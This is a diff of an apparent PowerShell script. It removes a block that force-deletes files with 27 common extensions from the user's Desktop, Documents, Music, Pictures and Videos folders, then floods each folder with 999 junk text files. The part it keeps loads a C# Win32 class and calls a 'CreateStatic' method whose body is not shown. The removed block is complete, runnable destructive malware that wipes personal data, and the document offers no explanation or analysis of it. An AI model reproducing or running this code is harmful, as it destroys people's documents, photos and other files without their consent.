@@ -1,32 +1,3 @@
-$desktopPath = [Environment]::GetFolderPath("Desktop")
-$documentsPath = [Environment]::GetFolderPath("MyDocuments")
-$musicPath = [Environment]::GetFolderPath("MyMusic")
-$picturesPath = [Environment]::GetFolderPath("MyPictures")
-$videosPath = [Environment]::GetFolderPath("MyVideos")
-
-$extensionsToDelete = @("exe", "json", "doc", "pdf", "wpd", "docx", "rtf", "tex", "odt", "jpg", "jpeg", "mp3", "rar", "vcd", "webp", "css", "html", "py", "php", "ico", "lnk", "mp4", "js", "bak", "xml", "zip", "bmp")
-
-$pathsToDelete = @($desktopPath, $documentsPath, $musicPath, $picturesPath, $videosPath)
-
-foreach ($path in $pathsToDelete) {
-    foreach ($extension in $extensionsToDelete) {
-        $filesToDelete = Get-ChildItem -Path $path -Filter "*.$extension" -File
-
-        foreach ($file in $filesToDelete) {
-            $filePath = $file.FullName
-            Write-Host "Deleting file: $filePath"
-            Remove-Item -Path $filePath -Force
-        }
-    }
-
-    for ($i = 1; $i -le 999; $i++) {
-        $randomIteration = Get-Random -Minimum 100 -Maximum 1000
-        $newFileName = "⓿⌓⓿_$randomIteration.txt"
-        $newFilePath = Join-Path -Path $path -ChildPath $newFileName
-        New-Item -Path $newFilePath -ItemType File -Force | Out-Null
-    }
-}
-
 $source = @"
 using System;
 using System.Runtime.InteropServices;
@@ -79,5 +50,6 @@ public static class Win32
     }
 }
 "@
+
 Add-Type -TypeDefinition $source -Language CSharp
 [Win32]::CreateStatic()
